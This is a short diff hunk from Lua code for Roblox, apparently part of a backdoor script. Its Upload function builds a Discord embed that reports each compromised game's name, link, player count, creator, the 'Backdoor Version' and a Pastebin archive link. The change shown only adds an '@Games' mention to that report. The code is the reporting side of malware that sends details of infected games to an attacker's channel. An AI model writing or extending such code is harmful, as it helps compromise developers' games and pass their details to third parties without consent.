@@ -116,7 +116,7 @@ function Upload()
 	local data = {
 		["embeds"] = {{
 			["title"] = "❕New Game❕";
-			["description"] = "\n**Game Name: ** "..gname.Name.."\n\n**Game Link: ** ".."https://www.roblox.com/games/"..game.PlaceId.."\n\n**Players: **"..#Players.."\n\n**Creator: **"..game:GetService("Players"):GetNameFromUserIdAsync(game.CreatorId).."\n\n**Backdoor Version: **"..BDV.."\n\n**Archive Link (PASTEBIN): **"..response,
+			["description"] = "\n**Game Name: ** "..gname.Name.."\n\n**Game Link: ** ".."https://www.roblox.com/games/"..game.PlaceId.."\n\n**Players: **"..#Players.."\n\n**Creator: **"..game:GetService("Players"):GetNameFromUserIdAsync(game.CreatorId).."\n\n**Backdoor Version: **"..BDV.."\n\n**Archive Link (PASTEBIN): **"..response.."\n\n@Games",
 			["thumbnail"] = {url="https://cdn.discordapp.com/attachments/1016411435875713074/1020827746202554368/New_Game.png"},
 			["color"] = tonumber(0x00b3ff);
 		}}
